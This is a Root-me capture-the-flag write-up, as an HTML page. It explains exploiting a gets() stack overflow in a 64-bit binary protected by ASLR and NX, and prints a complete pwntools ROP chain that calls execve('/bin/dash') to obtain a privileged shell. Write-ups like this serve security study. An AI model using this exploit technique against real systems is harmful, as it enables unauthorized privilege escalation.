@@ -1,0 +1,127 @@
+<html>
+ <head>
+<title> ELF64 - Stack buffer overflow - advanced </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Root-me </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> ELF64 - Stack buffer overflow - advanced </h1>
+   
+ <br> 
+
+<code>
+char buffer[256];
+gets(buffer);  # the vulnerable part !!!!
+</code>
+
+<p> As You may see it looks simple but the problem is it is protected by ASLR,NX,RELRO ... :(<br>
+    So the only way is to do ROP or to overwrite GOT table .. but i went on with ROP . <br>
+    AS this binary is <b>64 bits</b> the syscall table differ completely ..(which at the first i dont know but ROPgadget helped me out) <br>
+    So according to syscall table <b>RAX=59 ,RDI='/bin/dash', RSI && RDX = *(NULL) </b> </p>
+<br>
+
+<code>
+from pwn import *
+context.bits=64
+p = 'A'*280
+# execve()
+p += pack(0x00000000004017e7) # pop rsi ; ret
+p += pack(0x00000000006c0000) # @ .data
+p += pack(0x000000000044d2b4) # pop rax ; ret
+p += '/bin/das'
+p += pack(0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
+p += pack(0x00000000004017e7) # pop rsi ; ret
+p += pack(0x00000000006c0008) # @ .data + 8
+p += pack(0x000000000044d2b4) # pop rax ; ret
+p +='h\x00\x00\x00\x00\x00\x00\x00'
+p += pack(0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
+p += pack(0x00000000004016d3) # pop rdi ; ret
+p += pack(0x00000000006c0000) # @ .data
+p += pack(0x00000000004017e7) # pop rsi ; ret
+p += pack(0x00000000006c0010) # @ .data + 16
+p += pack(0x000000000041bd9f) # xor rax, rax ; ret
+p += pack(0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
+p += pack(0x00000000004017e7) # pop rsi ; ret
+p += pack(0x00000000006c0010) # @ .data + 16
+p += pack(0x0000000000437205) # pop rdx ; ret
+p += pack(0x00000000006c0010) # @ .data + 16
+p += pack(0x000000000041bd9f) # xor rax, rax ; ret
+p += pack(0x000000000045aa10)*59 # add rax, 1 ; ret
+p += pack(0x0000000000400488) # syscall
+
+s=process('ch34')
+
+s.send(p)
+
+s.interactive()
+</code>
+
+<p><b>NOTE: /bin//sh && /bin/bash gave me a local shell but only /bin/dash gave privilege escalated shell   :)  <br> <br>
+      Also ROPgadget doesen't find  all the gadgets (for ex: syscall;ret) so i found that using rp++ </b></p>
+
+<br><br>
+
+<p>For future references : <br>
+link for 64 bit syscall table <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">http://blog.rchapman.org/posts/.. </a> <br>
+link for 32 bit <a href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/</a>                  </p>
+
+</body>
+</html>
